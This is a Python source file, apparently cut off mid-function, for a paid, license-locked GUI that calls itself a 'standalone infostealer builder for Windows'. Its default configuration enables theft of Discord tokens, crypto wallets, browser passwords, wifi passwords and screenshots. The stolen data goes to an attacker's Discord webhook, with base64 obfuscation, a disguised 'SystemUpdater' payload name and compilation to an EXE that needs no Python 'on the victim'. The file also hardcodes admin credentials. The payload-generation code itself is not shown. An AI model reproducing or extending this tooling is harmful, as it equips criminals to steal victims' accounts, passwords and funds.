#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║   BRAISUDO GABBER PREMIUM  v5.3.1  -  Coded by braisudo__                  ║
║   Discord: https://discord.gg/aRPdy5sUA3                                  ║
║   FOR EDUCATIONAL PURPOSES ONLY                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import time
import uuid
import base64
import random
import hashlib
import platform
import threading
import webbrowser
import subprocess
import shutil
import tempfile
import zipfile
import re
import urllib.parse
from datetime import datetime, timedelta
from pathlib import Path


# ============ ENTORNO ============

IS_WINDOWS = os.name == "nt"
IS_FROZEN = bool(getattr(sys, "frozen", False))
CREATE_NO_WINDOW = 0x08000000 if IS_WINDOWS else 0
RUN_FLAGS = {"creationflags": CREATE_NO_WINDOW} if IS_WINDOWS else {}

DATE_FMT = "%Y-%m-%d %H:%M:%S"


def base_dir():
    try:
        if IS_FROZEN:
            return Path(sys.executable).resolve().parent
        return Path(__file__).resolve().parent
    except Exception:
        return Path.cwd()


def real_python():
    if not IS_FROZEN:
        return sys.executable
    candidates = []
    for name in ("python", "python3", "py"):
        found = shutil.which(name)
        if found:
            candidates.append(found)
    local = os.getenv("LOCALAPPDATA", "")
    for ver in ("Python314", "Python313", "Python312", "Python311",
                "Python310", "Python39"):
        candidates.append(os.path.join(local, "Programs", "Python", ver, "python.exe"))
    for root in (os.getenv("PROGRAMFILES", ""), os.getenv("PROGRAMFILES(X86)", "")):
        if root and os.path.isdir(root):
            try:
                for entry in sorted(os.listdir(root)):
                    if entry.lower().startswith("python"):
                        candidates.append(os.path.join(root, entry, "python.exe"))
            except Exception:
                pass
    for cand in candidates:
        if cand and os.path.exists(cand):
            return cand
    return None


def run_hidden(*args, **kwargs):
    kwargs.setdefault("stdin", subprocess.DEVNULL)
    for key, value in RUN_FLAGS.items():
        kwargs.setdefault(key, value)
    return subprocess.run(*args, **kwargs)


# ============ DEPENDENCIAS ============

def _pip_install(*pkgs):
    try:
        exe = real_python()
        if not exe:
            return
        run_hidden([exe, '-m', 'pip', 'install', *pkgs, '-q'],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass


try:
    import requests
except ImportError:
    _pip_install('requests')
    import requests

try:
    import customtkinter as ctk
    import tkinter as tk
    from tkinter import messagebox, filedialog
    CTK_AVAILABLE = True
except ImportError:
    _pip_install('customtkinter')
    import customtkinter as ctk
    import tkinter as tk
    from tkinter import messagebox, filedialog
    CTK_AVAILABLE = True


# ============ CONSTANTES ============

VERSION = "5.3.1"
TOOL_NAME = "BRAISUDO GABBER PREMIUM"
AUTHOR = "braisudo__"
DISCORD = "https://discord.gg/aRPdy5sUA3"
FIREBASE_URL = "https://braisudotoolcray-default-rtdb.firebaseio.com/"

ADMIN_USER = "braisudo"
ADMIN_PASS = "casa1piso2_"

APP_DIR = Path(os.getenv("APPDATA", str(Path.home()))) / "BraisudoGabber"
try:
    APP_DIR.mkdir(parents=True, exist_ok=True)
except Exception:
    APP_DIR = Path.cwd()

CONFIG_FILE = APP_DIR / "config.json"
SESSION_FILE = APP_DIR / "session.json"
HWID_FILE = APP_DIR / "hwid.txt"

USERNAME_RE = re.compile(r"^[A-Za-z0-9_]{3,20}$")
LICENSE_ALPHABET = "ABCDEFGHJKMNPQRSTUVWXYZ23456789"

LICENSE_TYPES = ("lifetime", "monthly", "custom")
MONTHLY_DAYS = 30

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")


# ============ IDIOMAS ============

STRINGS = {
    "es": {
        "app_tagline": "Constructor de infostealers\nstandalone para Windows",
        "chip_locked": "DEVICE-LOCKED", "chip_sync": "FIREBASE SYNC",
        "hwid_this": "HWID DE ESTE EQUIPO",
        "welcome_title": "ACCEDE AL TOOL",
        "welcome_sub": "Elige una opción para continuar.\nEl tool queda vinculado a este dispositivo.",
        "last_session": "ÚLTIMA SESIÓN",
        "btn_login": "  INICIAR SESIÓN  ", "btn_register": "  CREAR CUENTA  ",
        "conn_checking": "Comprobando conexión con el servidor…",
        "conn_online": "Servidor en línea · listo para entrar",
        "conn_offline": "Sin conexión con la base de datos",
        "register_title": "REGISTRO",
        "register_sub": "Crea tu cuenta y activa una licencia.\nEl equipo quedará vinculado a este usuario.",
        "login_title": "INICIAR SESIÓN",
        "login_sub": "Accede con tu cuenta. Solo funciona en el\ndispositivo donde te registraste.",
        "f_username": "USUARIO", "f_password": "CONTRASEÑA",
        "f_confirm": "REPETIR CONTRASEÑA", "f_license": "CLAVE DE LICENCIA",
        "ph_username": "3-20 caracteres · letras, números y _",
        "ph_password": "Mínimo 4 caracteres", "ph_confirm": "Vuelve a escribirla",
        "ph_license": "XXXX-XXXX-XXXX",
        "ph_login_user": "Tu nombre de usuario", "ph_login_pass": "Tu contraseña",
        "show_pass": "Mostrar contraseñas", "show_pass_s": "Mostrar contraseña",
        "match_ok": "✓  las contraseñas coinciden",
        "match_bad": "✗  las contraseñas no coinciden",
        "btn_create": "CREAR CUENTA Y CONTINUAR", "btn_enter": "ENTRAR",
        "have_account": "¿Ya tienes cuenta?", "go_login": "  INICIAR SESIÓN",
        "no_account": "¿Sin cuenta?", "go_register": "  CREAR CUENTA",
        "admin_hint": "acceso admin disponible para braisudo",
        "back_home": "←  VOLVER AL INICIO",
        "language": "IDIOMA",
        "checking": "VERIFICANDO…", "authenticating": "AUTENTICANDO…",
        "contacting": "Contactando con el servidor…",
        "verifying_admin": "Verificando credenciales de administrador…",
        "checking_creds": "Comprobando credenciales…",
        "err_user_empty": "Introduce un nombre de usuario",
        "err_user_invalid": "Usuario inválido: 3-20 caracteres, solo letras, números y _",
        "err_pass_short": "La contraseña debe tener al menos 4 caracteres",
        "err_pass_mismatch": "Las contraseñas no coinciden",
        "err_lic_empty": "Introduce una clave de licencia",
        "err_lic_short": "La clave de licencia parece demasiado corta",
        "err_fill_both": "Rellena usuario y contraseña",
        "err_no_user": "Introduce tu usuario", "err_no_pass": "Introduce tu contraseña",
        "err_exists": "El usuario '{u}' ya existe. Usa INICIAR SESIÓN.",
        "err_no_lic": "Licencia no encontrada. Revisa la clave.",
        "err_lic_revoked": "Licencia revocada.",
        "err_lic_banned": "Licencia bloqueada.",
        "err_lic_used": "Licencia ya usada por '{u}'.",
        "err_no_user_db": "No existe el usuario '{u}'",
        "err_bad_pass": "Contraseña incorrecta",
        "err_user_banned": "Tu cuenta está bloqueada por un administrador.",
        "err_other_device": "Este tool está vinculado a otro dispositivo.",
        "err_hwid_reg": "HWID registrado", "err_hwid_you": "Tu HWID",
        "err_lic_revoked_user": "Tu licencia ha sido revocada.",
        "err_lic_banned_user": "Tu licencia está bloqueada.",
        "err_lic_expired": "Tu licencia ha caducado. Contacta con un administrador.",
        "err_unexpected": "Error inesperado",
        "maint_title": "MODO MANTENIMIENTO",
        "maint_sub": "El servicio está temporalmente cerrado.\nVuelve a intentarlo en unos minutos.",
        "btn_retry": "REINTENTAR", "btn_skip": "SALTAR",
        "maint_asking": "Consultando…", "maint_still": "Sigue en mantenimiento.",
        "session_closed": "Sesión cerrada",
        "account_created": "Cuenta creada. Inicia sesión, {u}.",
        "nav_section": "  NAVEGACIÓN", "admin_section": "  ADMINISTRACIÓN",
        "nav_builder": "Builder", "nav_modules": "Módulos",
        "nav_options": "Opciones", "nav_console": "Consola", "nav_admin": "Admin",
        "topbar_sub": "standalone stealer builder",
        "badge_admin": " ADMIN ", "sub_admin": "admin · sin device-lock",
        "sub_user": "online · device-locked",
        "btn_logout": "SALIR",
        "status_ready": "✅  Listo", "status_building": "⏳  Construyendo…",
        "status_done": "✅  Build completado", "status_failed": "❌  Build fallido",
        "server_label": "SERVIDOR",
        "builder_title": "DESPLEGAR PAYLOAD",
        "builder_sub": "Introduce el webhook de Discord, elige módulos y genera tu ejecutable.",
        "f_webhook": "WEBHOOK DE DISCORD",
        "btn_test_webhook": "📡  PROBAR WEBHOOK", "btn_save": "💾  GUARDAR",
        "btn_build": "🔥   BUILD PAYLOAD", "btn_building": "⏳  CONSTRUYENDO…",
        "stat_modules": "MÓDULOS ACTIVOS", "stat_name": "NOMBRE DE SALIDA",
        "stat_mode": "MODO", "summary_title": "▸ RESUMEN RÁPIDO",
        "modules_title": "MÓDULOS DE RECOLECCIÓN",
        "modules_sub": "Pulsa una tarjeta para activarla o desactivarla.",
        "btn_enable_all": "ACTIVAR TODO", "btn_disable_all": "DESACTIVAR TODO",
        "mod_on": "ON", "mod_off": "OFF",
        "options_out": "📦  SALIDA", "f_payload_name": "NOMBRE DEL PAYLOAD",
        "f_out_dir": "CARPETA DE SALIDA", "btn_browse": "EXAMINAR",
        "options_beh": "⚙  COMPORTAMIENTO",
        "opt_obf": "Obfuscación base64", "opt_obf_sub": "Envuelve el payload en base64 + exec",
        "opt_exe": "Compilar a EXE standalone", "opt_exe_sub": "Requiere PyInstaller · tarda 1-3 min",
        "opt_rem": "Recordar usuario", "opt_rem_sub": "Rellena el login automáticamente",
        "opt_open": "Abrir carpeta al terminar", "opt_open_sub": "Abre el explorador con el EXE generado",
        "options_lang": "🌐  IDIOMA",
        "options_lang_sub": "Cambia el idioma de toda la interfaz",
        "options_adv": "▸ AVANZADO", "config_saved": "Configuración guardada en:",
        "console_title": "CONSOLA DE BUILD",
        "btn_clear": "LIMPIAR", "btn_export": "EXPORTAR",
        "admin_title": "PANEL DE ADMINISTRACIÓN",
        "admin_sub": "Genera licencias, bloquea o libera claves y gestiona usuarios.",
        "btn_refresh_all": "REFRESCAR TODO",
        "tab_generate": "GENERAR", "tab_licenses": "LICENCIAS", "tab_users": "USUARIOS",
        "gen_title": "🔑  GENERADOR DE LICENCIAS",
        "f_qty": "CANTIDAD", "f_prefix": "PREFIJO", "f_blocks": "BLOQUES", "f_len": "LONGITUD",
        "f_lic_type": "TIPO DE LICENCIA", "f_days": "DÍAS (PERSONALIZADA)",
        "lic_type_lifetime": "VITALICIA", "lic_type_month": "1 MES",
        "lic_type_custom": "PERSONALIZADA",
        "lic_badge_lifetime": " VITALICIA ", "lic_badge_month": " 1 MES ",
        "lic_badge_custom": " {n}D ",
        "btn_generate": "GENERAR", "gen_ready": "Listo para generar.",
        "gen_keys_title": "▸ CLAVES GENERADAS", "btn_copy_all": "COPIAR TODO",
        "btn_export_txt": "EXPORTAR .TXT",
        "gen_numeric_err": "Los campos numéricos son inválidos",
        "gen_qty_err": "Cantidad entre 1 y 500",
        "gen_blocks_err": "Bloques entre 1 y 5",
        "gen_len_err": "Longitud de bloque entre 3 y 8",
        "gen_days_err": "Días entre 1 y 3650",
        "gen_working": "Generando {n} claves…",
        "gen_none": "No se pudieron generar claves únicas",
        "gen_done": "✔ {n} licencias creadas ({ty})",
        "gen_none_copy": "No hay claves que copiar",
        "gen_none_exp": "No hay claves que exportar",
        "gen_copied": "Claves copiadas al portapapeles",
        "gen_exported": "Exportado a {p}",
        "btn_refresh": "REFRESCAR",
        "lic_loading": "Cargando licencias…", "usr_loading": "Cargando usuarios…",
        "lic_none": "No hay licencias todavía. Genera algunas en la pestaña GENERAR.",
        "usr_none": "Todavía no hay usuarios registrados.",
        "lic_free": "LIBRE", "lic_revoked": "REVOCADA", "lic_banned": "BANEADA",
        "lic_expired": "CADUCADA",
        "lic_used": "USADA · {u}", "lic_unknown": "DESCONOCIDO",
        "lic_no_expire": "sin caducidad", "lic_expires": "expira {d}",
        "btn_copy": "COPIAR", "btn_ban": "BANEAR", "btn_unban": "DESBANEAR",
        "btn_free": "LIBERAR", "btn_delete": "BORRAR", "btn_unbind": "LIBERAR HWID",
        "btn_renew": "RENOVAR",
        "badge_banned": " BANEADO ",
        "lic_summary": "{t} total  ·  {f} libres  ·  {u} usadas  ·  {b} baneadas  ·  {e} caducadas",
        "usr_summary": "{t} usuarios  ·  {b} baneados",
        "lic_meta": "creado {c}  ·  último login {l}",
        "lic_line": "licencia {l}  ·  hwid {h}…",
        "log_session": "Sesión iniciada como {u}",
        "log_device": "Dispositivo verificado · HWID {h}",
        "log_db": "Base de datos: {d}",
        "log_ready": "Listo. Configura el webhook y pulsa BUILD PAYLOAD.",
        "log_webhook_saved": "Webhook guardado en la configuración",
        "log_testing": "Probando webhook…", "log_webhook_ok": "Webhook OK",
        "log_webhook_http": "Webhook HTTP {c}",
        "log_webhook_err": "Webhook error: {e}",
        "log_build_start": "BUILD INICIADO", "log_webhook": "Webhook : {w}…",
        "log_name": "Nombre  : {n}", "log_mods": "Módulos : {n} activos",
        "log_opts": "Opciones: obfuscate={o} compile={c}",
        "log_generating": "Generando payload…",
        "log_payload": "Payload: {p} ({s} bytes)",
        "log_compiling": "Compilando a EXE (PyInstaller)…",
        "log_exe": "EXE: {p} ({s} bytes)",
        "log_standalone": "El EXE es standalone, no necesita Python en la víctima",
        "log_compile_fail": "La compilación falló. Revisa PyInstaller.",
        "log_build_done": "BUILD COMPLETADO",
        "log_error": "Error: {e}",
        "log_logs_exported": "Logs exportados a {p}",
        "log_export_err": "Error exportando: {e}",
        "log_admin_keys": "[ADMIN] {n} licencias generadas ({ty})",
        "log_admin_lic_ban": "[ADMIN] licencia {k} baneada",
        "log_admin_lic_unban": "[ADMIN] licencia {k} desbaneada",
        "log_admin_lic_free": "[ADMIN] licencia {k} liberada",
        "log_admin_lic_del": "[ADMIN] licencia {k} borrada",
        "log_admin_lic_renew": "[ADMIN] licencia {k} renovada",
        "log_admin_usr_ban": "[ADMIN] usuario {k} baneado",
        "log_admin_usr_unban": "[ADMIN] usuario {k} desbaneado",
        "log_admin_usr_unbind": "[ADMIN] HWID liberado para {k}",
        "log_admin_usr_del": "[ADMIN] usuario {k} borrado · licencia {l} liberada",
        "dlg_ok": "Correcto", "dlg_webhook_sent": "Webhook enviado correctamente",
        "dlg_error": "Error", "dlg_need_webhook": "Introduce un webhook primero",
        "dlg_bad_webhook": "Introduce un webhook de Discord válido",
        "dlg_bad_webhook_url": "URL de webhook de Discord inválida",
        "dlg_build_done": "Build completado",
        "dlg_build_msg": "Payload generado correctamente.\n\nPY: {p}\nID: {i}\n{exe}",
        "dlg_del_lic": "Borrar licencia", "dlg_del_lic_msg": "¿Borrar la licencia?\n\n{k}",
        "dlg_del_usr": "Borrar usuario",
        "dlg_del_usr_msg": "¿Borrar al usuario '{k}'?\n\nSu licencia también será liberada.",
        "dlg_ban_admin": "Banear admin",
        "dlg_ban_admin_msg": "Vas a banear al administrador.\nEl admin entra igual porque sus credenciales son maestras.\n\n¿Continuar?",
        "dlg_save_logs": "Guardar logs", "dlg_save_lic": "Guardar licencias",
        "dlg_pick_dir": "Selecciona la carpeta de salida",
        "txt_all": "Todos", "txt_files": "Texto",
    },
    "en": {
        "app_tagline": "Standalone infostealer\nbuilder for Windows",
        "chip_locked": "DEVICE-LOCKED", "chip_sync": "FIREBASE SYNC",
        "hwid_this": "HWID OF THIS MACHINE",
        "welcome_title": "ACCESS THE TOOL",
        "welcome_sub": "Pick an option to continue.\nThe tool is bound to this device.",
        "last_session": "LAST SESSION",
        "btn_login": "  SIGN IN  ", "btn_register": "  CREATE ACCOUNT  ",
        "conn_checking": "Checking server connection…",
        "conn_online": "Server online · ready to enter",
        "conn_offline": "No connection to the database",
        "register_title": "REGISTER",
        "register_sub": "Create your account and activate a license.\nThis machine will be bound to this user.",
        "login_title": "SIGN IN",
        "login_sub": "Log in with your account. Only works on\nthe device where you registered.",
        "f_username": "USERNAME", "f_password": "PASSWORD",
        "f_confirm": "CONFIRM PASSWORD", "f_license": "LICENSE KEY",
        "ph_username": "3-20 chars · letters, digits and _",
        "ph_password": "At least 4 characters", "ph_confirm": "Type it again",
        "ph_license": "XXXX-XXXX-XXXX",
        "ph_login_user": "Your username", "ph_login_pass": "Your password",
        "show_pass": "Show passwords", "show_pass_s": "Show password",
        "match_ok": "✓  passwords match",
        "match_bad": "✗  passwords do not match",
        "btn_create": "CREATE ACCOUNT AND CONTINUE", "btn_enter": "SIGN IN",
        "have_account": "Already have an account?", "go_login": "  SIGN IN",
        "no_account": "No account?", "go_register": "  CREATE ACCOUNT",
        "admin_hint": "admin access available for braisudo",
        "back_home": "←  BACK TO START",
        "language": "LANGUAGE",
        "checking": "CHECKING…", "authenticating": "AUTHENTICATING…",
        "contacting": "Contacting the server…",
        "verifying_admin": "Verifying administrator credentials…",
        "checking_creds": "Checking credentials…",
        "err_user_empty": "Enter a username",
        "err_user_invalid": "Invalid username: 3-20 chars, letters, digits and _ only",
        "err_pass_short": "Password must be at least 4 characters",
        "err_pass_mismatch": "Passwords do not match",
        "err_lic_empty": "Enter a license key",
        "err_lic_short": "The license key looks too short",
        "err_fill_both": "Fill in username and password",
        "err_no_user": "Enter your username", "err_no_pass": "Enter your password",
        "err_exists": "User '{u}' already exists. Use SIGN IN.",
        "err_no_lic": "License not found. Check the key.",
        "err_lic_revoked": "License revoked.",
        "err_lic_banned": "License blocked.",
        "err_lic_used": "License already used by '{u}'.",
        "err_no_user_db": "User '{u}' does not exist",
        "err_bad_pass": "Wrong password",
        "err_user_banned": "Your account is blocked by an administrator.",
        "err_other_device": "This tool is bound to another device.",
        "err_hwid_reg": "Registered HWID", "err_hwid_you": "Your HWID",
        "err_lic_revoked_user": "Your license has been revoked.",
        "err_lic_banned_user": "Your license is blocked.",
        "err_lic_expired": "Your license has expired. Contact an administrator.",
        "err_unexpected": "Unexpected error",
        "maint_title": "MAINTENANCE MODE",
        "maint_sub": "The service is temporarily closed.\nTry again in a few minutes.",
        "btn_retry": "RETRY", "btn_skip": "SKIP",
        "maint_asking": "Checking…", "maint_still": "Still under maintenance.",
        "session_closed": "Signed out",
        "account_created": "Account created. Sign in, {u}.",
        "nav_section": "  NAVIGATION", "admin_section": "  ADMINISTRATION",
        "nav_builder": "Builder", "nav_modules": "Modules",
        "nav_options": "Options", "nav_console": "Console", "nav_admin": "Admin",
        "topbar_sub": "standalone stealer builder",
        "badge_admin": " ADMIN ", "sub_admin": "admin · no device lock",
        "sub_user": "online · device-locked",
        "btn_logout": "SIGN OUT",
        "status_ready": "✅  Ready", "status_building": "⏳  Building…",
        "status_done": "✅  Build complete", "status_failed": "❌  Build failed",
        "server_label": "SERVER",
        "builder_title": "DEPLOY PAYLOAD",
        "builder_sub": "Paste the Discord webhook, pick modules and generate your executable.",
        "f_webhook": "DISCORD WEBHOOK",
        "btn_test_webhook": "📡  TEST WEBHOOK", "btn_save": "💾  SAVE",
        "btn_build": "🔥   BUILD PAYLOAD", "btn_building": "⏳  BUILDING…",
        "stat_modules": "ACTIVE MODULES", "stat_name": "OUTPUT NAME",
        "stat_mode": "MODE", "summary_title": "▸ QUICK SUMMARY",
        "modules_title": "COLLECTION MODULES",
        "modules_sub": "Click a card to enable or disable it.",
        "btn_enable_all": "ENABLE ALL", "btn_disable_all": "DISABLE ALL",
        "mod_on": "ON", "mod_off": "OFF",
        "options_out": "📦  OUTPUT", "f_payload_name": "PAYLOAD NAME",
        "f_out_dir": "OUTPUT FOLDER", "btn_browse": "BROWSE",
        "options_beh": "⚙  BEHAVIOUR",
        "opt_obf": "Base64 obfuscation", "opt_obf_sub": "Wraps the payload in base64 + exec",
        "opt_exe": "Compile to standalone EXE", "opt_exe_sub": "Needs PyInstaller · takes 1-3 min",
        "opt_rem": "Remember user", "opt_rem_sub": "Prefills the login form",
        "opt_open": "Open folder when done", "opt_open_sub": "Opens Explorer with the generated EXE",
        "options_lang": "🌐  LANGUAGE",
        "options_lang_sub": "Changes the language of the whole interface",
        "options_adv": "▸ ADVANCED", "config_saved": "Config saved at:",
        "console_title": "BUILD CONSOLE",
        "btn_clear": "CLEAR", "btn_export": "EXPORT",
        "admin_title": "ADMIN PANEL",
        "admin_sub": "Generate licenses, block or free keys and manage users.",
        "btn_refresh_all": "REFRESH ALL",
        "tab_generate": "GENERATE", "tab_licenses": "LICENSES", "tab_users": "USERS",
        "gen_title": "🔑  LICENSE GENERATOR",
        "f_qty": "QUANTITY", "f_prefix": "PREFIX", "f_blocks": "BLOCKS", "f_len": "LENGTH",
        "f_lic_type": "LICENSE TYPE", "f_days": "DAYS (CUSTOM)",
        "lic_type_lifetime": "LIFETIME", "lic_type_month": "1 MONTH",
        "lic_type_custom": "CUSTOM",
        "lic_badge_lifetime": " LIFETIME ", "lic_badge_month": " 1 MONTH ",
        "lic_badge_custom": " {n}D ",
        "btn_generate": "GENERATE", "gen_ready": "Ready to generate.",
        "gen_keys_title": "▸ GENERATED KEYS", "btn_copy_all": "COPY ALL",
        "btn_export_txt": "EXPORT .TXT",
        "gen_numeric_err": "Numeric fields are invalid",
        "gen_qty_err": "Quantity between 1 and 500",
        "gen_blocks_err": "Blocks between 1 and 5",
        "gen_len_err": "Block length between 3 and 8",
        "gen_days_err": "Days between 1 and 3650",
        "gen_working": "Generating {n} keys…",
        "gen_none": "Could not generate unique keys",
        "gen_done": "✔ {n} licenses created ({ty})",
        "gen_none_copy": "No keys to copy",
        "gen_none_exp": "No keys to export",
        "gen_copied": "Keys copied to clipboard",
        "gen_exported": "Exported to {p}",
        "btn_refresh": "REFRESH",
        "lic_loading": "Loading licenses…", "usr_loading": "Loading users…",
        "lic_none": "No licenses yet. Generate some in the GENERATE tab.",
        "usr_none": "No registered users yet.",
        "lic_free": "FREE", "lic_revoked": "REVOKED", "lic_banned": "BANNED",
        "lic_expired": "EXPIRED",
        "lic_used": "USED · {u}", "lic_unknown": "UNKNOWN",
        "lic_no_expire": "no expiry", "lic_expires": "expires {d}",
        "btn_copy": "COPY", "btn_ban": "BAN", "btn_unban": "UNBAN",
        "btn_free": "FREE", "btn_delete": "DELETE", "btn_unbind": "FREE HWID",
        "btn_renew": "RENEW",
        "badge_banned": " BANNED ",
        "lic_summary": "{t} total  ·  {f} free  ·  {u} used  ·  {b} banned  ·  {e} expired",
        "usr_summary": "{t} users  ·  {b} banned",
        "lic_meta": "created {c}  ·  last login {l}",
        "lic_line": "license {l}  ·  hwid {h}…",
        "log_session": "Session started as {u}",
        "log_device": "Device verified · HWID {h}",
        "log_db": "Database: {d}",
        "log_ready": "Ready. Set the webhook and hit BUILD PAYLOAD.",
        "log_webhook_saved": "Webhook saved to config",
        "log_testing": "Testing webhook…", "log_webhook_ok": "Webhook OK",
        "log_webhook_http": "Webhook HTTP {c}",
        "log_webhook_err": "Webhook error: {e}",
        "log_build_start": "BUILD STARTED", "log_webhook": "Webhook : {w}…",
        "log_name": "Name    : {n}", "log_mods": "Modules : {n} active",
        "log_opts": "Options : obfuscate={o} compile={c}",
        "log_generating": "Generating payload…",
        "log_payload": "Payload: {p} ({s} bytes)",
        "log_compiling": "Compiling to EXE (PyInstaller)…",
        "log_exe": "EXE: {p} ({s} bytes)",
        "log_standalone": "The EXE is standalone, no Python needed on the victim",
        "log_compile_fail": "Compilation failed. Check PyInstaller.",
        "log_build_done": "BUILD COMPLETE",
        "log_error": "Error: {e}",
        "log_logs_exported": "Logs exported to {p}",
        "log_export_err": "Export error: {e}",
        "log_admin_keys": "[ADMIN] {n} licenses generated ({ty})",
        "log_admin_lic_ban": "[ADMIN] license {k} banned",
        "log_admin_lic_unban": "[ADMIN] license {k} unbanned",
        "log_admin_lic_free": "[ADMIN] license {k} freed",
        "log_admin_lic_del": "[ADMIN] license {k} deleted",
        "log_admin_lic_renew": "[ADMIN] license {k} renewed",
        "log_admin_usr_ban": "[ADMIN] user {k} banned",
        "log_admin_usr_unban": "[ADMIN] user {k} unbanned",
        "log_admin_usr_unbind": "[ADMIN] HWID freed for {k}",
        "log_admin_usr_del": "[ADMIN] user {k} deleted · license {l} freed",
        "dlg_ok": "Success", "dlg_webhook_sent": "Webhook sent successfully",
        "dlg_error": "Error", "dlg_need_webhook": "Enter a webhook first",
        "dlg_bad_webhook": "Enter a valid Discord webhook",
        "dlg_bad_webhook_url": "Invalid Discord webhook URL",
        "dlg_build_done": "Build complete",
        "dlg_build_msg": "Payload generated successfully.\n\nPY: {p}\nID: {i}\n{exe}",
        "dlg_del_lic": "Delete license", "dlg_del_lic_msg": "Delete this license?\n\n{k}",
        "dlg_del_usr": "Delete user",
        "dlg_del_usr_msg": "Delete user '{k}'?\n\nTheir license will be freed too.",
        "dlg_ban_admin": "Ban admin",
        "dlg_ban_admin_msg": "You are about to ban the administrator.\nAdmin still gets in because the credentials are master.\n\nContinue?",
        "dlg_save_logs": "Save logs", "dlg_save_lic": "Save licenses",
        "dlg_pick_dir": "Pick the output folder",
        "txt_all": "All", "txt_files": "Text",
    },
}


class Lang:
    code = "es"

    @staticmethod
    def t(key, **kw):
        table = STRINGS.get(Lang.code) or STRINGS["es"]
        text = table.get(key) or STRINGS["es"].get(key, key)
        if kw:
            try:
                text = text.format(**kw)
            except Exception:
                pass
        return text


def t(key, **kw):
    return Lang.t(key, **kw)


def lic_type_label(ltype, duration=None):
    if ltype == "monthly":
        return t("lic_type_month")
    if ltype == "custom":
        return t("lic_type_custom")
    return t("lic_type_lifetime")


def lic_badge(ltype, duration=None):
    if ltype == "monthly":
        return t("lic_badge_month"), Theme.AMBER
    if ltype == "custom":
        return t("lic_badge_custom", n=duration or "?"), Theme.CYAN
    return t("lic_badge_lifetime"), Theme.PURPLE


def parse_dt(value):
    try:
        return datetime.strptime(str(value), DATE_FMT)
    except Exception:
        return None


def is_expired(expires):
    parsed = parse_dt(expires)
    if not parsed:
        return False
    return parsed < datetime.now()


# ============ TEMA ============

class Theme:
    BG_DEEP    = "#04060d"
    BG_PANEL   = "#070c17"
    BG_CARD    = "#0a1120"
    BG_INPUT   = "#0c1526"
    BG_HOVER   = "#101d33"
    BORDER     = "#16233d"
    BORDER_HI  = "#1f3a63"
    CYAN       = "#00e5ff"
    CYAN_DIM   = "#0a5f70"
    MAGENTA    = "#ff2bd6"
    MAGENTA_DIM= "#6d1660"
    PURPLE     = "#7c5cff"
    PURPLE_DIM = "#3a2c78"
    GREEN      = "#00ff9d"
    GREEN_DIM  = "#0a5c3d"
    RED        = "#ff4d6d"
    RED_DIM    = "#6b1f2f"
    AMBER      = "#ffb020"
    AMBER_DIM  = "#5c3f0c"
    TEXT       = "#dce9ff"
    TEXT_DIM   = "#6d81a8"
    TEXT_MUTE  = "#43536f"


FONT_TITLE = ("Segoe UI Semibold", 26, "bold")
FONT_BRAND = ("Segoe UI Semibold", 34, "bold")
FONT_H     = ("Segoe UI Semibold", 13, "bold")
FONT_BODY  = ("Segoe UI", 12)
FONT_SMALL = ("Segoe UI", 11)
FONT_TINY  = ("Segoe UI", 10)
FONT_MONO  = ("Consolas", 11)
FONT_MONO_S= ("Consolas", 10)
FONT_NAV   = ("Segoe UI Semibold", 13, "bold")
FONT_LABEL = ("Segoe UI Semibold", 10, "bold")


# ============ UTILIDADES ============

_HWID_CACHE = None


def get_hwid():
    global _HWID_CACHE
    if _HWID_CACHE:
        return _HWID_CACHE
    try:
        if HWID_FILE.exists():
            saved = HWID_FILE.read_text(encoding="utf-8").strip()
            if saved:
                _HWID_CACHE = saved
                return saved
    except Exception:
        pass

    parts = [platform.node() or "", platform.machine() or "",
             str(uuid.getnode() or ""), platform.system() or ""]

    uuid_value = ""
    try:
        out = run_hidden('wmic csproduct get uuid', shell=True,
                         capture_output=True, text=True, timeout=8).stdout
        lines = [l.strip() for l in out.split('\n') if l.strip()]
        if len(lines) > 1 and lines[1].upper() not in (
                "UUID", "FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF"):
            uuid_value = lines[1]
    except Exception:
        pass
    if not uuid_value:
        try:
            out = run_hidden(
                ['powershell', '-NoProfile', '-NonInteractive', '-Command',
                 '(Get-CimInstance Win32_ComputerSystemProduct).UUID'],
                capture_output=True, text=True, timeout=10).stdout.strip()
            if out and "FFFFFFFF" not in out.upper():
                uuid_value = out
        except Exception:
            pass
    if uuid_value:
        parts.append(uuid_value)

    digest = hashlib.sha256("|".join(parts).encode("utf-8", errors="ignore")).hexdigest().upper()
    _HWID_CACHE = "-".join(digest[i:i + 4] for i in range(0, 24, 4))
    try:
        HWID_FILE.write_text(_HWID_CACHE, encoding="utf-8")
    except Exception:
        pass
    return _HWID_CACHE


def hash_password(username, password):
    return hashlib.sha256(f"{username.lower()}::gabber::{password}".encode()).hexdigest()


def now_iso():
    return datetime.now().strftime(DATE_FMT)


def open_url(url):
    try:
        webbrowser.open(url)
    except Exception:
        pass


def gen_license_key(prefix="GABBER", blocks=3, length=4):
    parts = ["".join(random.choice(LICENSE_ALPHABET) for _ in range(length))
             for _ in range(blocks)]
    return f"{prefix}-" + "-".join(parts)


def resolve_dir(raw, fallback_name="output"):
    try:
        path = Path(str(raw or fallback_name)).expanduser()
        if not path.is_absolute():
            path = base_dir() / path
        path.mkdir(parents=True, exist_ok=True)
        return path
    except Exception:
        try:
            fallback = APP_DIR / fallback_name
            fallback.mkdir(parents=True, exist_ok=True)
            return fallback
        except Exception:
            return Path.cwd()


class LocalStore:
    DEFAULT_CONFIG = {
        "lang": "es",
        "output_dir": "output",
        "payload_name": "SystemUpdater",
        "obfuscate": True,
        "auto_compile": True,
        "open_folder": True,
        "webhook": "",
        "remember": True,
        "modules": {
            "discord": True, "crypto_wallets": True, "system_info": True,
            "browser_passwords": True, "browser_cookies": False,
            "browser_history": False, "wifi_passwords": True, "screenshot": True,
            "file_grabber": False, "steam": False, "spotify": False,
            "telegram": False, "outlook": False,
        },
    }

    def __init__(self, host=None):
        self._host = host
        self._job = None
        self.config = self._load(CONFIG_FILE, self.DEFAULT_CONFIG)
        self.session = self._load(SESSION_FILE, {"username": "", "hwid": get_hwid()})

    @staticmethod
    def _load(path, default):
        try:
            if path.exists():
                with open(path, "r", encoding="utf-8") as f:
                    data = json.load(f)
                    if isinstance(data, dict):
                        merged = dict(default)
                        merged.update(data)
                        return merged
        except Exception:
            pass
